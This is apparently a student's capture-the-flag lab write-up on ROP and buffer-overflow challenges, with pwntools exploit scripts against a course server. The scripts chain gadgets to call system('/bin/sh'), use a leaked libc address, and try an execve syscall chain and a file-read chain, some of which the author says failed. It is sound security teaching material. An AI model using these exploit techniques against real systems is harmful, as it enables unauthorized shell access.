z5256275 Lachlan Waugh
==========================================================

swrop
==========================================================
Flag:
----------------------------------------------------------
    FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNi1zd3JvcCIsImlwIjoiMTAxLjE2NC4zMy4yMTkiLCJzZXNzaW9uIjoiZGRmZGFlODAtNDNkZi00NjU2LWFhNjItYTJjOGYyZjdlYWM5In0.gYrTvPGNX_vt--Uu4q8QU3dje7Nb3HPxbk6DRx-HNzQ}

General overview:
----------------------------------------------------------
1. The function not_call() invokes system("bin/date")
2. The address right after "bin/date" stores "bin/sh"
2. Invoke the system() part of not_call(), and write the address for bin/sh onto the stack

Script used:
----------------------------------------------------------

```python
#!usr/bin/env python2

from pwn import *

p = remote("plsdonthaq.me", 6001)

payload = b"A" * 0x88
payload += p32(0x080484ed)  # address for system() in not_call()
payload += p32(0x080485f0)  # address for bin/sh

p.sendlineafter(">", payload)

p.interactive()
```


static
==========================================================
Flag:
----------------------------------------------------------
    FLAG{}

General overview:
----------------------------------------------------------
TODO: WRITEUP SOLUTION
1. I thought I was pretty close to completing this exericse, however I wasn't able to crack it, my understanding was that i'd need to achieve a few things
    * have eax stored 0xb (the code for execve)
    * have ecx, edx, and esi point to NULL
    * write "bin/sh\0" to some buffer and point ebx to this buffer
2. I was able to achieve the first two using the provided gadgets, however I couldn't work out how to where to write "bin/sh" to
3. My first attepmt (commented) was trying to write it to a memory location and point ebx to that memory location.
4. My second attempt (not commented) was trying to write it onto the stack and have pop this into ebx, but this wasn't working either unfortunately.

Script used:
----------------------------------------------------------

```python
#!usr/bin/python

from pwn import *

p = remote("plsdonthaq.me", 6002)

payload = b"/bin/sh\x00"
payload += b"A" * 0x8

# ebx := *(/bin/sh\x00)
payload += p32(0x0806ee5b)  # push eax; ...; pop ebx

# edx := 0
payload += p32(0x0806eb8b)  # pop edx; ret
payload += p32(0x00000000)

# eax := 0x0b
payload += p32(0x08056200)  # xor eax, eax; ret
payload += p32(0x0807c01a) * 11 # inc eax * 11

# ecx := 0; int 0x80
payload += p32(0x0806ef51)  # xor ecx, ecx; int 0x80

p.sendlineafter("\n", payload)

p.interactive()
p.close()
```


roproprop
==========================================================
General overview:
----------------------------------------------------------
1. Pretty similar to the same exercise in the tutorial, the program leaks the address of setbuf
2. Use this leaked address to find the addresses of system() and the string "bin/sh" in the provided libc
3. Write these addresses onto the stack

Flag:
----------------------------------------------------------
    FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNi1yb3Byb3Byb3AiLCJpcCI6IjEwMS4xNjQuMzMuMjE5Iiwic2Vzc2lvbiI6ImE3YThlYjM0LTI4M2YtNDI3NC04YWMxLTVhMmZjNDlhZDMxZiJ9.P93C_w0Q8fOy9qe8JIH7tpA8j1uO6MDJUNAKvbrfOf8}

Script used:
----------------------------------------------------------

```python
#!usr/bin/python

from pwn import *

p = remote("plsdonthaq.me", 6003)

p.recvuntil("- ")
line = p.recvuntil(" -\n", drop=True)

setbuf = int(line, 16)
libc_b = setbuf - 0x65ff0
system = libc_b + 0x3ada0
bin_sh = libc_b + 0x15ba0b

payload = b"A" * 0x4ce
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(bin_sh)

p.sendlineafter("?\n", payload)

p.interactive()
```


ropme
==========================================================
General overview:
----------------------------------------------------------
1. I couldn't work out how to complete this challenge unfortunately. Despite my best efforts.
2. My understand was that this would be an exercise where you would attempt to open the flag file, read it, then write the string received back. (The flag file). However as open() doesn't interact with fgets() (file descriptor vs file pointer), it wasn't working.
3. Another problem I had was that working on this locally I had to use gdb to change the name of the stored flag file (from "/flag" to "flag"), how do you have a flag named "/flag" in Linux?

Flag:
----------------------------------------------------------
    FLAG{}

Script used:
----------------------------------------------------------

```python
#!usr/bin/python

from pwn import *

p = remote("plsdonthaq.me", 6004)

payload = b"A" * 0xc

# payload += p32(0x08048592)
# payload += p32(0x12345678)

# payload += p32(0x08048592)
# payload += p32(0x12345678)
# payload += p32(0x0804864a)

# Open up the flag file
payload += p32(0x080483c0)  # open()
payload += p32(0x0804860a)  # pop; pop; ret (to ignore the arguments)
payload += p32(0x0804864a)  # "/flag"
payload += p32(0x00000000)  # 0 for mode

# Read the flag file (reusing fgets() from vuln (pointing to just after eax is loaded with stdin))
payload += p32(0x08048522)  # fgets (with the fd from the above open, which is now pushed to the stack)

# Write the flag to stdout (the next thing on the stack should be the buffer from the fgets())
payload += p32(0x08048592)  # puts (with ecx pushed onto the stack which puts the string from the file) and return
payload += p32(0x12345678)  # dummy return value

p.sendlineafter("data:", payload)

p.interactive()
```


re
==========================================================
General overview:
----------------------------------------------------------
1. I don't believe what I produced really followed exactly what was intended, I was on the fence as to whether the looping malloc was allocating memory for an object in the struct (such as an array of ints stored in one struct), or whether it was an array of structs, (which is what I kind of went for).


Code:
----------------------------------------------------------

```C
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

typedef struct item {
    int a;
    int b;
} item_t;

item_t *new() {
    item_t *new = NULL, *temp;

    for (int index = 4; index <= 36; index += 4) {
        temp = malloc(sizeof(item_t));
        if (temp == NULL) {
            exit(1);
            return NULL;
        }

        if (new == NULL)
            *new = *temp;
        else
            *(new + index) = *temp;

        new->a = 0x41;
        new->b = 0;

    }

    return new;
}
```
